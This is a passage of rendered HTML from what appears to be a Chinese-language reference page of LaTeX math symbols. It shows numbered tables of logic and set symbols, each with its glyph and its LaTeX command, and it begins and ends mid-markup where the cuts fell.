class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>⊢</mo></mrow><annotation encoding="application/x-tex">\vdash</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mrel">⊢</span></span></span></span></td><td style="text-align:left">\vdash</td></tr><tr><td style="text-align:center">6</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>&amp;</mo></mrow><annotation encoding="application/x-tex">\And</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord">&amp;</span></span></span></span></td><td style="text-align:left">\And</td><td style="text-align:center">25</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>⊣</mo></mrow><annotation encoding="application/x-tex">\dashv</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mrel">⊣</span></span></span></span></td><td style="text-align:left">\dashv</td></tr><tr><td style="text-align:center">7</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>∨</mo></mrow><annotation encoding="application/x-tex">\lor</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.55556em;vertical-align:0em;"></span><span class="mord">∨</span></span></span></span></td><td style="text-align:left">\lor</td><td style="text-align:center">26</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>⊨</mo></mrow><annotation encoding="application/x-tex">\vDash</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69224em;vertical-align:0em;"></span><span class="mrel amsrm">⊨</span></span></span></span></td><td style="text-align:left">\vDash</td></tr><tr><td style="text-align:center">8</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>∨</mo></mrow><annotation encoding="application/x-tex">\vee</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.55556em;vertical-align:0em;"></span><span class="mord">∨</span></span></span></span></td><td style="text-align:left">\vee</td><td style="text-align:center">27</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>⊩</mo></mrow><annotation encoding="application/x-tex">\Vdash</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69224em;vertical-align:0em;"></span><span class="mrel amsrm">⊩</span></span></span></span></td><td style="text-align:left">\Vdash</td></tr><tr><td style="text-align:center">9</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>⋎</mo></mrow><annotation encoding="application/x-tex">\curlyvee</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.54986em;vertical-align:0em;"></span><span class="mord amsrm">⋎</span></span></span></span></td><td style="text-align:left">\curlyvee</td><td style="text-align:center">28</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>⊨</mo></mrow><annotation encoding="application/x-tex">\models</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.999em;vertical-align:-0.249em;"></span><span class="mrel">⊨</span></span></span></span></td><td style="text-align:left">\models</td></tr><tr><td style="text-align:center">10</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>⋁</mo></mrow><annotation encoding="application/x-tex">\bigvee</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.00001em;vertical-align:-0.25001em;"></span><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">⋁</span></span></span></span></td><td style="text-align:left">\bigvee</td><td style="text-align:center">29</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>⊪</mo></mrow><annotation encoding="application/x-tex">\Vvdash</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69224em;vertical-align:0em;"></span><span class="mrel amsrm">⊪</span></span></span></span></td><td style="text-align:left">\Vvdash</td></tr><tr><td style="text-align:center">11</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>∧</mo></mrow><annotation encoding="application/x-tex">\land</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.55556em;vertical-align:0em;"></span><span class="mord">∧</span></span></span></span></td><td style="text-align:left">\land</td><td style="text-align:center">30</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>⊬</mo></mrow><annotation encoding="application/x-tex">\nvdash</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68889em;vertical-align:0em;"></span><span class="mrel amsrm">⊬</span></span></span></span></td><td style="text-align:left">\nvdash</td></tr><tr><td style="text-align:center">12</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>∧</mo></mrow><annotation encoding="application/x-tex">\wedge</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.55556em;vertical-align:0em;"></span><span class="mord">∧</span></span></span></span></td><td style="text-align:left">\wedge</td><td style="text-align:center">31</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>⊮</mo></mrow><annotation encoding="application/x-tex">\nVdash</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68889em;vertical-align:0em;"></span><span class="mrel amsrm">⊮</span></span></span></span></td><td style="text-align:left">\nVdash</td></tr><tr><td style="text-align:center">13</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>⋏</mo></mrow><annotation encoding="application/x-tex">\curlywedge</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.54986em;vertical-align:0em;"></span><span class="mord amsrm">⋏</span></span></span></span></td><td style="text-align:left">\curlywedge</td><td style="text-align:center">32</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>⊭</mo></mrow><annotation encoding="application/x-tex">\nvDash</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68889em;vertical-align:0em;"></span><span class="mrel amsrm">⊭</span></span></span></span></td><td style="text-align:left">\nvDash</td></tr><tr><td style="text-align:center">14</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>⋀</mo></mrow><annotation encoding="application/x-tex">\bigwedge</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.00001em;vertical-align:-0.25001em;"></span><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">⋀</span></span></span></span></td><td style="text-align:left">\bigwedge</td><td style="text-align:center">33</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>⊯</mo></mrow><annotation encoding="application/x-tex">\nVDash</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68889em;vertical-align:0em;"></span><span class="mrel amsrm">⊯</span></span></span></span></td><td style="text-align:left">\nVDash</td></tr><tr><td style="text-align:center">15</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mover accent="true"><mi>q</mi><mo>ˉ</mo></mover></mrow><annotation encoding="application/x-tex">\bar{q}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7622199999999999em;vertical-align:-0.19444em;"></span><span class="mord accent"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.56778em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">q</span></span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="accent-body" style="left:-0.16666em;"><span class="mord">ˉ</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.19444em;"><span></span></span></span></span></span></span></span></span></td><td style="text-align:left">\bar{q}</td><td style="text-align:center">34</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo><mi mathvariant="normal">⌜</mi></mo></mrow><annotation encoding="application/x-tex">\ulcorner</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69224em;vertical-align:0em;"></span><span class="mopen amsrm">┌</span></span></span></span></td><td style="text-align:left">\ulcorner</td></tr><tr><td style="text-align:center">16</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mover accent="true"><mrow><mi>a</mi><mi>b</mi><mi>c</mi></mrow><mo>ˉ</mo></mover></mrow><annotation encoding="application/x-tex">\bar{abc}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8312199999999998em;vertical-align:0em;"></span><span class="mord accent"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8312199999999998em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="mord mathnormal">b</span><span class="mord mathnormal">c</span></span></span><span style="top:-3.26344em;"><span class="pstrut" style="height:3em;"></span><span class="accent-body" style="left:-0.25em;"><span class="mord">ˉ</span></span></span></span></span></span></span></span></span></span></td><td style="text-align:left">\bar{abc}</td><td style="text-align:center">35</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo><mi mathvariant="normal">⌝</mi></mo></mrow><annotation encoding="application/x-tex">\urcorner</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69224em;vertical-align:0em;"></span><span class="mclose amsrm">┐</span></span></span></span></td><td style="text-align:left">\urcorner</td></tr><tr><td style="text-align:center">17</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mover accent="true"><mi>q</mi><mo stretchy="true">‾</mo></mover></mrow><annotation encoding="application/x-tex">\overline{q}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.825em;vertical-align:-0.19444em;"></span><span class="mord overline"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.63056em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">q</span></span></span><span style="top:-3.55056em;"><span class="pstrut" style="height:3em;"></span><span class="overline-line" style="border-bottom-width:0.04em;"></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.19444em;"><span></span></span></span></span></span></span></span></span></td><td style="text-align:left">\overline{q}</td><td style="text-align:center">36</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo><mi mathvariant="normal">⌞</mi></mo></mrow><annotation encoding="application/x-tex">\llcorner</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.37788em;vertical-align:0em;"></span><span class="mopen amsrm">└</span></span></span></span></td><td style="text-align:left">\llcorner</td></tr><tr><td style="text-align:center">18</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mover accent="true"><mrow><mi>a</mi><mi>b</mi><mi>c</mi></mrow><mo stretchy="true">‾</mo></mover></mrow><annotation encoding="application/x-tex">\overline{abc}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.89444em;vertical-align:0em;"></span><span class="mord overline"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.89444em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="mord mathnormal">b</span><span class="mord mathnormal">c</span></span></span><span style="top:-3.81444em;"><span class="pstrut" style="height:3em;"></span><span class="overline-line" style="border-bottom-width:0.04em;"></span></span></span></span></span></span></span></span></span></td><td style="text-align:left">\overline{abc}</td><td style="text-align:center">37</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo><mi mathvariant="normal">⌟</mi></mo></mrow><annotation encoding="application/x-tex">\lrcorner</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.37788em;vertical-align:0em;"></span><span class="mclose amsrm">┘</span></span></span></span></td><td style="text-align:left">\lrcorner</td></tr><tr><td style="text-align:center">19</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">¬</mi></mrow><annotation encoding="application/x-tex">\lnot</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord">¬</span></span></span></span></td><td style="text-align:left">\lnot</td><td style="text-align:center"></td><td style="text-align:center"></td><td style="text-align:left"></td></tr></tbody></table><h3 id="217-集合-sets"><a class="markdownIt-Anchor" href="#217-集合-sets"></a> 2.1.7 集合 Sets</h3><table><thead><tr><th style="text-align:center">序号</th><th style="text-align:center">图标</th><th style="text-align:left">LaTeX</th><th style="text-align:center">序号</th><th style="text-align:center">图标</th><th style="text-align:left">LaTeX</th></tr></thead><tbody><tr><td style="text-align:center">1</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">{</mo><mo stretchy="false">}</mo></mrow><annotation encoding="application/x-tex">\{\}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">{</span><span class="mclose">}</span></span></span></span></td><td style="text-align:left">{}</td><td style="text-align:center">23</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>⊏</mo></mrow><annotation encoding="application/x-tex">\sqsubset</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58503em;vertical-align:-0.03517em;"></span><span class="mrel amsrm">⊏</span></span></span></span></td><td style="text-align:left">\sqsubset</td></tr><tr><td style="text-align:center">2</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">∅</mi></mrow><annotation encoding="application/x-tex">\emptyset</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.80556em;vertical-align:-0.05556em;"></span><span class="mord">∅</span></span></span></span></td><td style="text-align:left">\emptyset</td><td style="text-align:center">24</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>⊃</mo></mrow><annotation encoding="application/x-tex">\supset</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mrel">⊃</span></span></span></span></td><td style="text-align:left">\supset</td></tr><tr><td style="text-align:center">3</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">∅</mi></mrow><annotation encoding="application/x-tex">\varnothing</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.66334em;vertical-align:-0.08167em;"></span><span class="mord amsrm">∅</span></span></span></span></td><td style="text-align:left">\varnothing</td><td style="text-align:center">25</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>⋑</mo></mrow><annotation encoding="application/x-tex">\Supset</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58503em;vertical-align:-0.03517em;"></span><span class="mrel amsrm">⋑</span></span></span></span></td><td style="text-align:left">\Supset</td></tr><tr><td style="text-align:center">4</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>∈</mo></mrow><annotation encoding="application/x-tex">\in</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mrel">∈</span></span></span></span></td><td style="text-align:left">\in</td><td style="text-align:center">26</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>⊐</mo></mrow><annotation encoding="application/x-tex">\sqsupset</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58503em;vertical-align:-0.03517em;"></span><span class="mrel amsrm">⊐</span></span></span></span></td><td style="text-align:left">\sqsupset</td></tr><tr><td style="text-align:center">5</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo mathvariant="normal">∉</mo></mrow><annotation encoding="application/x-tex">\notin</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mrel"><span class="mord"><span class="mrel">∈</span></span><span class="mord vbox"><span class="thinbox"><span class="llap"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="inner"><span class="mord"><span class="mord">/</span><span class="mspace" style="margin-right:0.05555555555555555em;"></span></span></span><span class="fix"></span></span></span></span></span></span></span></span></td><td style="text-align:left">\notin</td><td style="text-align:center">27</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>⊆</mo></mrow><annotation encoding="application/x-tex">\subseteq</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7719400000000001em;vertical-align:-0.13597em;"></span><span class="mrel">⊆</span></span></span></span></td><td style="text-align:left">\subseteq</td></tr><tr><td style="text-align:center">6</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>∋</mo></mrow><annotation encoding="application/x-tex">\ni</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mrel">∋</span></span></span></span></td><td style="text-align:left">\ni</td><td style="text-align:center">28</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>⊈</mo></mrow><annotation encoding="application/x-tex">\nsubseteq</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.09657em;vertical-align:-0.30274em;"></span><span class="mrel amsrm">⊈</span></span></span></span></td><td style="text-align:left">\nsubseteq</td></tr><tr><td style="text-align:center">7</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>∩</mo></mrow><annotation encoding="application/x-tex">\cap</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.55556em;vertical-align:0em;"></span><span class="mord">∩</span></span></span></span></td><td style="text-align:left">\cap</td><td style="text-align:center">29</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>⊊</mo></mrow><annotation encoding="application/x-tex">\subsetneq</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7719400000000001em;vertical-align:-0.13597em;"></span><span class="mrel amsrm">⊊</span></span></span></span></td><td style="text-align:left">\subsetneq</td></tr><tr><td style="text-align:center">8</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>⋒</mo></mrow><annotation encoding="application/x-tex">\Cap</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.54986em;vertical-align:0em;"></span><span class="mord amsrm">⋒</span></span></span></span></td><td style="text-align:left">\Cap</td><td style="text-align:center">30</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>⊊</mo></mrow><annotation encoding="application/x-tex">\varsubsetneq</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7719400000000001em;vertical-align:-0.13597em;"></span><span class="mrel amsrm"></span></span></span></span></td><td style="text-align:left">\varsubsetneq</td></tr><tr><td style="text-align:center">9</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>⊓</mo></mrow><annotation encoding="application/x-tex">\sqcap</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.55556em;vertical-align:0em;"></span><span class="mord">⊓</span></span></span></span></td><td style="text-align:left">\sqcap</td><td style="text-align:center">31</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>⊑</mo></mrow><annotation encoding="application/x-tex">\sqsubseteq</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7719400000000001em;vertical-align:-0.13597em;"></span><span class="mrel">⊑</span></span></span></span></td><td style="text-align:left">\sqsubseteq</td></tr><tr><td style="text-align:center">10</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>⋂</mo></mrow><annotation encoding="application/x-tex">\bigcap</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.00001em;vertical-align:-0.25001em;"></span><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">⋂</span></span></span></span></td><td style="text-align:left">\bigcap</td><td style="text-align:center">32</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>⊇</mo></mrow><annotation encoding="application/x-tex">\supseteq</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7719400000000001em;vertical-align:-0.13597em;"></span><span class="mrel">⊇</span></span></span></span></td><td style="text-align:left">\supseteq</td></tr><tr><td style="text-align:center">11</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>∪</mo></mrow><annotation encoding="application/x-tex">\cup</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.55556em;vertical-align:0em;"></span><span class="mord">∪</span></span></span></span></td><td style="text-align:left">\cup</td><td style="text-align:center">33</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>⊉</mo></mrow><annotation encoding="application/x-tex">\nsupseteq</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.09657em;vertical-align:-0.30274em;"></span><span class="mrel amsrm">⊉</span></span></span></span></td><td style="text-align:left">\nsupseteq</td></tr><tr><td style="text-align:center">12</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>⋓</mo></mrow><annotation encoding="application/x-tex">\Cup</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.54986em;vertical-align:0em;"></span><span class="mord amsrm">⋓</span></span></span></span></td><td style="text-align:left">\Cup</td><td style="text-align:center">34</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>⊋</mo></mrow><annotation encoding="application/x-tex">\supsetneq</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7719400000000001em;vertical-align:-0.13597em;"></span><span class="mrel amsrm">⊋</span></span></span></span></td><td style="text-align:left">\supsetneq</td></tr><tr><td style="text-align:center">13</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>⊔</mo></mrow><annotation encoding="application/x-tex">\sqcup</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.55556em;vertical-align:0em;"></span><span class="mord">⊔</span></span></span></span></td><td style="text-align:left">\sqcup</td><td style="text-align:center">35</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>⊋</mo></mrow><annotation encoding="application/x-tex">\varsupsetneq</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7719400000000001em;vertical-align:-0.13597em;"></span><span class="mrel amsrm"></span></span></span></span></td><td style="text-align:left">\varsupsetneq</td></tr><tr><td style="text-align:center">14</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>⋃</mo></mrow><annotation encoding="application/x-tex">\bigcup</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.00001em;vertical-align:-0.25001em;"></span><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">⋃</span></span></span></span></td><td style="text-align:left">\bigcup</td><td style="text-align:center">36</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>⊒</mo></mrow><annotation encoding="application/x-tex">\sqsupseteq</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7719400000000001em;vertical-align:-0.13597em;"></span><span class="mrel">⊒</span></span></span></span></td><td style="text-align:left">\sqsupseteq</td></tr><tr><td style="text-align:center">15</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>⨆</mo></mrow><annotation encoding="application/x-tex">\bigsqcup</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.00001em;vertical-align:-0.25001em;"></span><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">⨆</span></span></span></span></td><td style="text-align:left">\bigsqcup</td><td style="text-align:center">37</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>⫅</mo></mrow><annotation encoding="application/x-tex">\subseteqq</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.01166em;vertical-align:-0.25583em;"></span><span class="mrel amsrm">⫅</span></span></span></span></td><td style="text-align:left">\subseteqq</td></tr><tr><td style="text-align:center">16</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>⊎</mo></mrow><annotation encoding="application/x-tex">\uplus</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.55556em;vertical-align:0em;"></span><span class="mord">⊎</span></span></span></span></td><td style="text-align:left">\uplus</td><td style="text-align:center">38</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>⊈</mo></mrow><annotation encoding="application/x-tex">\nsubseteqq</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.00868em;vertical-align:-0.25142em;"></span><span class="mrel amsrm"></span></span></span></span></td><td style="text-align:left">\nsubseteqq</td></tr><tr><td style="text-align:center">17</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>⨄</mo></mrow><annotation encoding="application/x-tex">\biguplus</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.00001em;vertical-align:-0.25001em;"></span><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">⨄</span></span></span></span></td><td style="text-align:left">\biguplus</td><td style="text-align:center">39</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math 